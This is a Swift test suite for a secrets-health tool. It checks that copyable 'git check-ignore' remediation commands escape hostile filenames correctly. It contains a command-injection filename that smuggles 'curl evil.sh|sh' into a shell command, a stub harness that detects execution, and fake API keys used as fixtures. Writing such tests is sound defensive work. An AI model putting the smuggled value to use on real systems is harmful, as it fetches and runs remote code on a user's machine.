import Foundation
import Testing
@testable import SopsHealth

private struct Projects: ProjectSourceProviding {
    let projects: [InspectedProject]
}

private func leakFinding(_ findings: [HealthFinding]) -> HealthFinding {
    findings.first { $0.id.hasSuffix("gitignore") }!
}

private func run(_ root: URL) async -> [HealthFinding] {
    await ProjectHealthCheck(source: Projects(
        projects: [InspectedProject(name: "demo", rootPath: root.path)])).run()
}

/// A filename that turns a naively quoted `echo '<name>' >> .gitignore` into a
/// command that downloads and runs a script. Nothing about it is exotic — it is
/// a legal macOS filename, and since the tree walk replaced the old hardcoded
/// three-filename list, any file in any repository the user cloned reaches the
/// remediation string.
private let injectionName = "';curl evil.sh|sh;'.env"

/// A shell harness that makes execution of a remediation command *observable*.
/// `curl` on its PATH is a stub that creates a marker file, so "the command
/// ran something" becomes a filesystem fact rather than a judgement call.
private struct ShellHarness {
    let directory: URL
    let markerPath: String
    let searchPath: String

    static func make() throws -> ShellHarness {
        let directory = try ProjectFixture.makeDirectory("shell-harness")
        let bin = directory.appendingPathComponent("bin")
        try FileManager.default.createDirectory(at: bin, withIntermediateDirectories: true)

        let marker = directory.appendingPathComponent("EXECUTED").path
        for name in ["curl", "wget"] {
            let stub = bin.appendingPathComponent(name)
            try "#!/bin/sh\n: > \"\(marker)\"\n".write(to: stub, atomically: true, encoding: .utf8)
            try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: stub.path)
        }
        return ShellHarness(directory: directory, markerPath: marker,
                            searchPath: bin.path + ":/usr/bin:/bin:/usr/sbin:/sbin:/opt/homebrew/bin")
    }

    /// Runs `command` the way a user would: pasted into a shell, with the
    /// project directory as the working directory.
    @discardableResult
    func run(_ command: String, in workingDirectory: URL) throws -> (status: Int32, output: String) {
        let process = Process()
        process.executableURL = URL(fileURLWithPath: "/bin/sh")
        process.arguments = ["-c", command]
        process.currentDirectoryURL = workingDirectory
        process.environment = ["PATH": searchPath, "HOME": directory.path]
        let pipe = Pipe()
        process.standardOutput = pipe
        process.standardError = pipe
        try process.run()
        let data = pipe.fileHandleForReading.readDataToEndOfFile()
        process.waitUntilExit()
        return (process.terminationStatus, String(decoding: data, as: UTF8.self))
    }

    var executedSomething: Bool { FileManager.default.fileExists(atPath: markerPath) }
}

/// The remediation strings this check produces are attacker-influenced text.
///
/// `ProjectHealthCheck` used to build `echo '<name>' >> .gitignore` by wrapping
/// the filename in single quotes and nothing else. That was safe only for as
/// long as `<name>` came from a hardcoded list of three literals. Replacing
/// that list with a full tree walk — the fix for the false "No unignored
/// plaintext secret files found." — put every filename in every cloned
/// repository into that string.
///
/// The app does not execute the command. It does not have to: the Copy button
/// exists precisely to move the string into a shell the user does control.
@Suite("ProjectHealthCheck remediation quoting")
struct ProjectRemediationQuotingTests {

    // MARK: - The escaping primitive

    @Test("single quotes inside a name are closed, escaped and reopened")
    func singleQuotesAreEscaped() {
        #expect(ShellQuoting.singleQuoted("plain.env") == "'plain.env'")
        #expect(ShellQuoting.singleQuoted("it's.env") == "'it'\\''s.env'")
        #expect(ShellQuoting.singleQuoted(injectionName) == "''\\'';curl evil.sh|sh;'\\''.env'")
    }

    /// `"bad\r\nname.env"` is the case whose absence let the CRLF bug through:
    /// `"\r\n"` is a single Swift `Character`, so a refusal written against the
    /// `Character` `"\n"` does not see it, and a name broken by a Windows line
    /// ending would have been quoted into a "single-line" command that in fact
    /// spans two.
    @Test("a name containing a line break cannot be quoted at all",
          arguments: ["bad\nname.env", "bad\rname.env", "bad\r\nname.env", "trailing.env\n"])
    func newlinesAreRefusedRatherThanEscaped(name: String) {
        #expect(ShellQuoting.singleQuoted(name) == nil)
    }

    /// The escaping is only worth anything if a real shell agrees. Every string
    /// here round-trips through `/bin/sh` and must come back byte-identical.
    @Test("every quoted name round-trips through a real shell unchanged",
          arguments: ["plain.env", "it's.env", injectionName, "-n", "-e.env",
                      "a b.env", "$HOME.env", "`id`.env", "\\.env", "*.env", "a\"b.env"])
    func quotingRoundTripsThroughARealShell(name: String) throws {
        let harness = try ShellHarness.make()
        let quoted = try #require(ShellQuoting.singleQuoted(name))
        let (status, output) = try harness.run("printf '%s' \(quoted)", in: harness.directory)

        #expect(status == 0)
        #expect(output == name, "shell produced \(output.debugDescription) for \(name.debugDescription)")
        #expect(!harness.executedSomething)
    }

    // MARK: - The commands the check actually emits

    /// The headline case. A repository with no `.gitignore` and a hostile
    /// filename: the finding is a real `.problem`, and whatever it offers to
    /// copy must not be a program.
    ///
    /// Ticket #8, claim 4: this branch used to offer no command at all —
    /// `.gitignore`-line generation is still refused (see the
    /// `gitignoreFinding` doc comment: a pattern needs a second escaping
    /// layer this app will not attempt), but a `git check-ignore -v --`
    /// verification command now is offered, built the same
    /// `ShellQuoting`-safe way as the `.undetermined` branch always has. The
    /// property this test exists to prove is unchanged: whatever the command
    /// is, it must never execute anything when a user pastes it into a
    /// shell — that is what a hostile filename in a cloned repository is
    /// trying to make happen.
    @Test("a hostile filename never produces a command that runs anything")
    func hostileFilenameProducesNoExecutableCommand() async throws {
        let root = try ProjectFixture.makeDirectory()
        try ProjectFixture.gitInit(root)
        try ProjectFixture.write("creation_rules:\n  - age: \(try ProjectFixture.ageKeyPair().public)\n",
                                 to: root, at: ".sops.yaml")
        try ProjectFixture.write("STRIPE_KEY=sk_live_51H8xQ2abcdefg\n", to: root, at: injectionName)

        let leak = leakFinding(await run(root))
        #expect(leak.status == .problem)
        #expect(leak.detail.contains(injectionName))
        #expect(!leak.detail.contains("sk_live_51H8xQ2abcdefg"))
        #expect(leak.remediation?.explanation.contains(injectionName) == true)

        // The command exists now (claim 4) and is the check-ignore
        // verification, not a generated `.gitignore` line — so it must be
        // present, safely quoted, and harmless to run.
        let command = try #require(leak.remediation?.command)
        #expect(command.hasPrefix("git check-ignore -v -- "), "\(command)")
        #expect(!command.contains(".gitignore"), "a .gitignore-editing command was generated: \(command)")

        // The assertion that would have failed before either fix, regardless
        // of which remediation shape was chosen: pasted into a real shell,
        // nothing runs.
        let harness = try ShellHarness.make()
        try harness.run(command, in: root)
        #expect(!harness.executedSomething, "the copyable command executed a program: \(command)")
    }

    /// The other branch. Ticket #8, claim 2: "not inside a git repository at
    /// all" is now its own definite `.noRepository` verdict, not
    /// `.undetermined` — so the fixture that still genuinely reaches
    /// `.undetermined` (git found, but its answer about *this* repository
    /// could not be trusted) is a damaged repository, not a missing one. It
    /// offers `git check-ignore` so the user can find out for themselves.
    /// That command *is* worth keeping — it needs only shell escaping, with
    /// no second pattern layer — so it must be escaped correctly rather than
    /// dropped.
    @Test("the check-ignore command is escaped, not merely wrapped in quotes")
    func checkIgnoreCommandIsProperlyEscaped() async throws {
        let root = try ProjectFixture.makeDirectory()
        try ProjectFixture.gitInit(root)
        // Damage the repository after `git init` so `git rev-parse
        // --is-inside-work-tree` cannot answer — see
        // `GitIgnoreOracleFailureTests` for the same shape used directly
        // against the oracle.
        try FileManager.default.removeItem(at: root.appendingPathComponent(".git/refs"))
        try FileManager.default.removeItem(at: root.appendingPathComponent(".git/HEAD"))
        try ProjectFixture.write("creation_rules:\n  - age: \(try ProjectFixture.ageKeyPair().public)\n",
                                 to: root, at: ".sops.yaml")
        try ProjectFixture.write("STRIPE_KEY=sk_live_51H8xQ2abcdefg\n", to: root, at: injectionName)

        let leak = leakFinding(await run(root))
        guard case .unknown = leak.status else {
            Issue.record("expected .unknown for a damaged repository, got \(leak.status)")
            return
        }
        let command = try #require(leak.remediation?.command)

        let harness = try ShellHarness.make()
        _ = try harness.run(command, in: root)
        #expect(!harness.executedSomething, "the copyable command executed a program: \(command)")

        // And it still does its job: `echo` in place of `git` shows the shell
        // handed exactly one argument through, byte for byte.
        let echoed = try harness.run(
            command.replacingOccurrences(of: "git check-ignore -v", with: "printf '%s\\n'"), in: root)
        #expect(echoed.output.contains(injectionName), "\(echoed.output)")
    }

    /// A filename that begins with `-` is an option as far as any CLI is
    /// concerned. Quoting does not help; only `--` does.
    @Test("a filename beginning with a dash is passed as a path, not an option")
    func leadingDashFilenameIsNotParsedAsAnOption() async throws {
        let root = try ProjectFixture.makeDirectory()
        try ProjectFixture.gitInit(root)
        try ProjectFixture.write("creation_rules:\n  - age: \(try ProjectFixture.ageKeyPair().public)\n",
                                 to: root, at: ".sops.yaml")
        try ProjectFixture.write("DB_PASSWORD=hunter2\n", to: root, at: "-v.env")

        let command = try #require(leakFinding(await run(root)).remediation?.command)
        #expect(command.contains(" -- "), "\(command)")

        // git must answer the question rather than complain about usage.
        // check-ignore exits 0 (ignored) or 1 (not ignored); 128/129 is git
        // rejecting the command line.
        let harness = try ShellHarness.make()
        let outcome = try harness.run(command, in: root)
        #expect(outcome.status == 0 || outcome.status == 1 || outcome.status == 128,
                "git exited \(outcome.status): \(outcome.output)")
        #expect(!outcome.output.lowercased().contains("unknown option"), "\(outcome.output)")
        #expect(!outcome.output.lowercased().contains("usage:"), "\(outcome.output)")
    }

    /// A newline in a filename cannot be represented in `.gitignore` at all and
    /// makes a single-line copyable command a lie. The check must say so rather
    /// than emit something that silently does the wrong thing.
    @Test("a filename containing a newline produces no command, in either branch",
          arguments: [true, false])
    func newlineFilenameProducesNoCommand(insideRepository: Bool) async throws {
        let root = try ProjectFixture.makeDirectory()
        if insideRepository { try ProjectFixture.gitInit(root) }
        try ProjectFixture.write("creation_rules:\n  - age: \(try ProjectFixture.ageKeyPair().public)\n",
                                 to: root, at: ".sops.yaml")
        try ProjectFixture.write("DB_PASSWORD=hunter2\n", to: root, at: "two\nlines.env")

        let leak = leakFinding(await run(root))
        #expect(leak.remediation?.command == nil,
                "built a command for a filename with a newline: \(leak.remediation?.command ?? "")")
        // It still names the file, which is the useful half.
        #expect(leak.detail.contains("lines.env"))
    }

    /// An embedded single quote is the case naive wrapping gets wrong without
    /// any hostile intent behind it.
    @Test("an apostrophe in a filename does not break the command")
    func apostropheFilenameIsQuotedCorrectly() async throws {
        let root = try ProjectFixture.makeDirectory()
        try ProjectFixture.gitInit(root)
        try ProjectFixture.write("creation_rules:\n  - age: \(try ProjectFixture.ageKeyPair().public)\n",
                                 to: root, at: ".sops.yaml")
        try ProjectFixture.write("DB_PASSWORD=hunter2\n", to: root, at: "ivan's.env")

        let command = try #require(leakFinding(await run(root)).remediation?.command)
        #expect(command.contains("'ivan'\\''s.env'"), "\(command)")

        let harness = try ShellHarness.make()
        let echoed = try harness.run(
            command.replacingOccurrences(of: "git check-ignore -v", with: "printf '%s\\n'"), in: root)
        #expect(echoed.output.contains("ivan's.env"), "\(echoed.output)")
    }

    /// The ordinary case must stay ordinary: no escaping noise on a plain name.
    @Test("a plain filename produces a plain command")
    func plainFilenameIsUnchanged() async throws {
        let root = try ProjectFixture.makeDirectory()
        try ProjectFixture.gitInit(root)
        try ProjectFixture.write("creation_rules:\n  - age: \(try ProjectFixture.ageKeyPair().public)\n",
                                 to: root, at: ".sops.yaml")
        try ProjectFixture.write("DB_PASSWORD=hunter2\n", to: root, at: ".env")

        let command = try #require(leakFinding(await run(root)).remediation?.command)
        #expect(command == "git check-ignore -v -- '.env'", "\(command)")
    }
}
